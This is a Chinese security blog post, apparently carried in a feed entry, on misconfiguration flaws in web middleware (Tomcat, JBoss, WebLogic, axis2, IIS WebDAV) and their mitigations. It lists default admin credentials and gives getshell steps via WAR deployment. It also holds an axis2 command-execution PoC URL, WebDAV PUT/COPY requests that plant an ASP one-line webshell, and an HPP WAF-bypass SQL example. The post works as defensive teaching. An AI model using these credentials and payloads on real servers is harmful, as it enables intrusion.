-    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">博观而约取，厚积而薄发</blockquote><br>　　中间件漏洞可以说是最容易被web管理员忽视的漏洞，原因很简单，因为这并不是应用程序代码上存在的漏洞，而是属于一种应用部署环境的配置不当或者使用不当造成的。那么从实际情况来看，预防这种漏洞最大的难点，在于中间件安全该由谁负责？<br><a id="more"></a><br>　　我们在处理应急响应事件时经常遇到这么一种情况，客户网站代码是外包的，也就是第三方公司负责开发，而部署可能是由客户内部运维人员负责。暂不说他们对于中间件安全的重视程度与了解程度，只谈发现漏洞后如何处理，便是一团乱。开发商推卸说这并不是代码上的问题，他们完全是按照安全开发流程（SDL）走的，所以跟他无关；运维人员就一脸蒙蔽了，反驳道：你们当初没跟我说要配置什么啊，只是让我安装个程序就ok了，我怎么知道？<br>　　那么除此之外，开发人员以及运维人员对中间件安全意识的缺失也是一个重要因素，有些开发商可能会对自身代码进行安全检测，但只对代码部分进行审查是远远不够的。本篇用来记录总结一些常见的web中间件漏洞以及防护问题（记录的只是一部分，不代表全部），内容一部分摘自道哥的《白帽子讲web安全》一书，算做读书笔记亦或者读后感。</p>
-<h3 id="中间件、容器、服务器傻傻分不清？"><a href="#中间件、容器、服务器傻傻分不清？" class="headerlink" title="中间件、容器、服务器傻傻分不清？"></a>中间件、容器、服务器傻傻分不清？</h3><p>　　在谈中间件安全问题时，我觉得有必要先梳理下以上几种关系以及概念。当初我在接触这些概念时，脑子里就是一团浆糊，中间件、容器、服务器、webserver等等概念感觉彼此很相似，但又有所区别。因此在书写本篇时，我特意翻查了一些资料，试图梳理清这几者之间的关系，参考了文章：<a href="http://www.voidcn.com/blog/saoraozhe3hao/article/p-2428756.html" target="_blank" rel="external">http://www.voidcn.com/blog/saoraozhe3hao/article/p-2428756.html</a></p>
-<h4 id="基础概念与作用"><a href="#基础概念与作用" class="headerlink" title="基础概念与作用"></a>基础概念与作用</h4><p>这里只介绍web中间件、web服务器、web容器，因为除了web以外，其概念还可以扩展为数据库等。</p>
-<h5 id="web服务器"><a href="#web服务器" class="headerlink" title="web服务器"></a>web服务器</h5><p>web服务器用于提供http服务，即向客户端返回信息，其可以处理HTTP协议，响应针对静态页面或图片的请求，控制页面跳转，或者把动态请求委托其它程序（中间件程序）等。</p>
-<h5 id="web中间件"><a href="#web中间件" class="headerlink" title="web中间件"></a>web中间件</h5><p>web中间件用于提供系统软件和应用软件之间的连接，以便于软件各部件之间的沟通，其可以为一种或多种应用程序提供容器。</p>
-<h5 id="web容器"><a href="#web容器" class="headerlink" title="web容器"></a>web容器</h5><p>web容器用于给处于其中的应用程序组件（JSP，SERVLET）提供一个环境，是中间件的一个组成部分，它实现了对动态语言的解析。比如tomcat可以解析jsp，是因为其内部有一个jsp容器。</p>
-<h4 id="所属的类别"><a href="#所属的类别" class="headerlink" title="所属的类别"></a>所属的类别</h4><p>web服务器：IIS、Apache、nginx、tomcat、weblogic、websphere等。<br>web中间件：apache tomcat、BEA WebLogic、IBM WebSphere等。<br>web容器：JSP容器、SERVLET容器、ASP容器等。</p>
-<p>注意：web中间件与web服务器是有重叠的，原因在于tomcat等web中间件也具备web服务器的功能。</p>
-<h4 id="重点分析"><a href="#重点分析" class="headerlink" title="重点分析"></a>重点分析</h4><p>　　web服务器只是提供静态网页解析（如apache），或者提供跳转的这么一种服务。而web中间件（其包含web容器）可以解析动态语言，比如tomcat可以解析jsp（因为tomcat含有jsp容器），当然它也可以解析静态资源，因此它既是web中间件也是web服务器。不过tomcat解析静态资源的速度不如apache，因此常常两者结合使用。</p>
-<h3 id="Tomcat漏洞与防护"><a href="#Tomcat漏洞与防护" class="headerlink" title="Tomcat漏洞与防护"></a>Tomcat漏洞与防护</h3><p>　　tomcat是apache的一个中间件软件，其可以提供jsp或者php的解析服务，为了方便远程管理与部署，安装完tomcat以后默认会有一个管理页面，管理员只需要远程上传一个WAR格式的文件，便可以将内容发布到网站，这一功能方便了管理员的同时也给黑客打开了方便之门，除此之外，tomcat还有一些样本页面，如果处理不当也会导致安全问题。</p>
-<h4 id="tomcat远程部署漏洞详情"><a href="#tomcat远程部署漏洞详情" class="headerlink" title="tomcat远程部署漏洞详情"></a>tomcat远程部署漏洞详情</h4><p>tomcat管理地址通常是：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Http://localhost:8080/manager</div></pre></td></tr></table></figure></p>
-<p>默认账号密码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">root/root</div><div class="line">tomcat/tomcat </div><div class="line">admin admin</div><div class="line">admin 123456</div></pre></td></tr></table></figure></p>
-<h5 id="tomcat口令爆破"><a href="#tomcat口令爆破" class="headerlink" title="tomcat口令爆破"></a>tomcat口令爆破</h5><p>　　在默认不对tomcat做任何配置的时候爆破是无效的，而如果设置了账号密码就可以进行爆破。Tomcat的认证比较弱，Base64(用户名:密码)编码，请求响应码如果不是401（未经授权：访问由于凭据无效被拒绝。）即表示登录成功。登录成功后，可直接上传war文件，getshell（当然上传war文件需要manager权限）</p>
-<h5 id="getshell过程"><a href="#getshell过程" class="headerlink" title="getshell过程"></a>getshell过程</h5><p>首先将我们的.jsp shell文件打包为war文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">jar -cvf shell.war shell.jsp</div></pre></td></tr></table></figure></p>
-<p>登录管理页面后，选择上传war文件。<br><img src="/upload_image/20170525/1.png" alt=""><br>截图中间的目录便是上传成功以后的木马文件，可以点击浏览。<br><img src="/upload_image/20170525/2.png" alt=""><br>直接在当前目录下访问shell.jsp。</p>
-<h4 id="Session-Example样本页面"><a href="#Session-Example样本页面" class="headerlink" title="Session Example样本页面"></a>Session Example样本页面</h4><p>默认地址：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/servlets-examples/servlet/SessionExample</div></pre></td></tr></table></figure></p>
-<p>用来设置任意会话变量，恶意使用可对应用程序造成破坏。</p>
-<h4 id="tomcat漏洞防护"><a href="#tomcat漏洞防护" class="headerlink" title="tomcat漏洞防护"></a>tomcat漏洞防护</h4><ul>
-<li>升级tomcat版本</li>
-<li>删除远程部署页面，或者限定页面的访问权限。</li>
-<li>找到/conf/tomcat-users.xml修改用户名密码以及权限。</li>
-<li>删除样例页面文件</li>
-</ul>
-<h3 id="JBoss漏洞与防护"><a href="#JBoss漏洞与防护" class="headerlink" title="JBoss漏洞与防护"></a>JBoss漏洞与防护</h3><p>JBoss这是一个基于JavaEE的应用服务器，与tomcat类似的是jboss也有远程部署平台，但不需要登陆。漏洞利用过程与tomcat类似，因此不再截图说明。除了远程部署漏洞外，jboss还存在反序列化漏洞，这里不再详述。</p>
-<h4 id="JBoss远程部署漏洞详情"><a href="#JBoss远程部署漏洞详情" class="headerlink" title="JBoss远程部署漏洞详情"></a>JBoss远程部署漏洞详情</h4><p>默认管理后台地址：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:8080</div></pre></td></tr></table></figure></p>
-<h4 id="getshell过程-1"><a href="#getshell过程-1" class="headerlink" title="getshell过程　　"></a>getshell过程　　</h4><p>　　访问管理页面，查看jboss配置页面中的JMX Console，这是JBoss的管理台程序，进入后找到Jboss.deployment包，该包下有flavor=URL.type=DeploymentSccanner选项。进入部署页面后便可以上传war文件，但与tomcat不同的是它不是本地上传war文件，而是从远程地址下载，因此需要自己准备一个文件服务器，用于远程下载war到目标jboss服务器上。具体方法是在部署页面找到”ADDURL”方法，输入URL地址，点击invoke。除了以上方法外，JMX-Console提供的BSH方法，同样也可以部署war包。</p>
-<h4 id="JBoss漏洞防护"><a href="#JBoss漏洞防护" class="headerlink" title="JBoss漏洞防护"></a>JBoss漏洞防护</h4><ul>
-<li>开启jmx-console密码认证</li>
-<li>删除jmx-console.war与web-console.war</li>
-</ul>
-<h3 id="WebLogic漏洞与防护"><a href="#WebLogic漏洞与防护" class="headerlink" title="WebLogic漏洞与防护"></a>WebLogic漏洞与防护</h3><p>weblogic是一个基于JavaEE构架的中间件，安装完weblogic默认会监听7001端口。漏洞利用过程与tomcat类似，因此不再截图说明。</p>
-<h4 id="Weblogic远程部署漏洞详情"><a href="#Weblogic远程部署漏洞详情" class="headerlink" title="Weblogic远程部署漏洞详情"></a>Weblogic远程部署漏洞详情</h4><p>默认后台地址：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:7001/console/login/loginForm.jsp</div></pre></td></tr></table></figure></p>
-<p>账号密码：</p>
-<ul>
-<li>用户名密码均为：weblogic</li>
-<li>用户名密码均为：system</li>
-<li>用户名密码均为：portaladmin</li>
-<li>用户名密码均为：guest</li>
-</ul>
-<h4 id="getshell过程-2"><a href="#getshell过程-2" class="headerlink" title="getshell过程"></a>getshell过程</h4><p>成功登陆weblogic后台后，找到部署按钮，点击后选择安装，然后可以选择本地上传war包也可以利用远程url下载，部署完成后，weblogic会给出文件地址。</p>
-<h4 id="Weblogic漏洞防护"><a href="#Weblogic漏洞防护" class="headerlink" title="Weblogic漏洞防护"></a>Weblogic漏洞防护</h4><ul>
-<li>删除远程部署页面</li>
-</ul>
-<h3 id="axis2漏洞与防护"><a href="#axis2漏洞与防护" class="headerlink" title="axis2漏洞与防护"></a>axis2漏洞与防护</h3><p>axis2也是apache的一个项目，是新一代的SOAP引擎，其存在一个任意命令执行漏洞。（该漏洞来自补天平台）</p>
-<h4 id="axis2命令执行漏洞详情"><a href="#axis2命令执行漏洞详情" class="headerlink" title="axis2命令执行漏洞详情"></a>axis2命令执行漏洞详情</h4><p>默认后台地址：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/axis2-admin/</div></pre></td></tr></table></figure></p>
-<p>默认账号密码：admin与axis2<br>登录后效果如下：<br><img src="/upload_image/20170525/3.png" alt=""><br>执行系统命令poc<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/services/Axis2Shell/execCmd?cmd=whoami</div></pre></td></tr></table></figure></p>
-<h3 id="IIS漏洞与防护"><a href="#IIS漏洞与防护" class="headerlink" title="IIS漏洞与防护"></a>IIS漏洞与防护</h3><p>　　IIS是微软的一款web服务器，其配置不当容易产生webdav漏洞。webdav本身是iis的一项扩展功能，开启后可以使用除了get、post以外的一些请求类型，比如put等。但如果配置不当，就会导致文件上传漏洞。除了webdav漏洞，近期还爆出了一个远程命令执行漏洞，具体移步：<a href="http://thief.one/2017/03/29/IIS6-0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2017-7269/">IIS6.0远程命令执行漏洞(CVE-2017-7269)</a></p>
-<h4 id="IIS-Webdav漏洞详情"><a href="#IIS-Webdav漏洞详情" class="headerlink" title="IIS Webdav漏洞详情"></a>IIS Webdav漏洞详情</h4><p>　　当测试一个站点是否存在webdav漏洞时，可以先构造一个OPTIONS请求，若返回200，则查看返回头的Allow参数中包含哪些方法（可以请求）。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">OPTIONS  / HTTP/1.1</div><div class="line">Host:thief.one</div></pre></td></tr></table></figure></p>
-<p>如果存在PUT方法，则可以尝试写入一个txt文件。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">PUT /shell.txt HTTP/1.1</div><div class="line">HOST:thief.one</div><div class="line">Content-length:30</div><div class="line"></div><div class="line">&lt;%<span class="built_in">eval</span> request(<span class="string">"nmask"</span>)%&gt;</div></pre></td></tr></table></figure></p>
-<p>　　若返回200则说明上传成功，此时可以手动访问此文件，确认是否存在。当然也有可能返回403，这表示此目录没有上传的权限，可以尝试上传到其他目录。<br>通过MOVE或COPY方法改文件后缀名。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">COPY /shell.txt HTTP/1.1</div><div class="line">HOST:thief.one</div><div class="line">Destination:http://thief.one/shell.asp</div></pre></td></tr></table></figure></p>
-<h4 id="IIS漏洞防护"><a href="#IIS漏洞防护" class="headerlink" title="IIS漏洞防护"></a>IIS漏洞防护</h4><ul>
-<li>关闭webdav功能</li>
-</ul>
-<h3 id="Apache漏洞与防护"><a href="#Apache漏洞与防护" class="headerlink" title="Apache漏洞与防护"></a>Apache漏洞与防护</h3><p>　　Apache本身也存在一些漏洞，比如slowhttp漏洞，当然官方认为其是apache的特性而不算是一种漏洞，然而事实证明它的危害真的很大。除了slowhttp漏洞以外，其第三方moudle存在很多反序列化或者远程命令执行的漏洞。</p>
-<h4 id="Apache-slowhttp漏洞详情"><a href="#Apache-slowhttp漏洞详情" class="headerlink" title="Apache slowhttp漏洞详情"></a>Apache slowhttp漏洞详情</h4><p>关于slowhttp漏洞请移步：<a href="http://thief.one/2017/05/10/1/">浅谈DDOS攻击与防御</a></p>
-<h3 id="HPP漏洞"><a href="#HPP漏洞" class="headerlink" title="HPP漏洞"></a>HPP漏洞</h3><p>HPP漏洞是web容器处理http参数时的问题，前面几款web服务器都或多或少存在这样的问题。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    <span class="variable">$str</span>=<span class="variable">$_REQUEST</span>[<span class="string">'str'</span>];                    <span class="comment">#$_REQUEST[]函数可以接受GET/POST。</span></div><div class="line">    Echo <span class="variable">$str</span>;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
-<p>比如访问URL:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.xxx.com/index.php?str=hello</div></pre></td></tr></table></figure></p>
-<p>此时页面显示hello<br>但如果访问:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.xxx.com/index.php?str=hello&amp;str=world&amp;str=nmask</div></pre></td></tr></table></figure></p>
-<p>此时页面显示nmask，把前面参数的值给覆盖了，这就是http参数污染。</p>
-<h4 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h4><p>绕过WAF，如：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PHP:index.php?str=1&amp;str=select * from admin --</div></pre></td></tr></table></figure></p>
-<p>因为WAF可能会校验值的第一个单词，如果为select则触发，这样子可以避免被触发。</p>
-<h3 id="传送门"><a href="#传送门" class="headerlink" title="传送门"></a>传送门</h3><p>除了以上这些漏洞以外，web服务器还有着一些解析动态语言时存在的漏洞，移步：<a href="http://thief.one/2016/09/21/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/">服务器解析漏洞 | nMask’Blog</a></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;博观而约取，厚积而薄发&lt;/blockquote&gt;&lt;br&gt;　　中间件漏洞可以说是最容易被web管理员忽视的漏洞，原因很简单，因为这并不是应用程序代码上存在的漏洞，而是属于一种应用部署环境的配置不当或者使用不当造成的。那么从实际情况来看，预防这种漏洞最大的难点，在于中间件安全该由谁负责？&lt;br&gt;
-    
-    </summary>
-    
-      <category term="web安全" scheme="http://thief.one/categories/web%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="中间件漏洞" scheme="http://thief.one/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/"/>
-    
-      <category term="中间件安全" scheme="http://thief.one/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
     
   </entry>
   
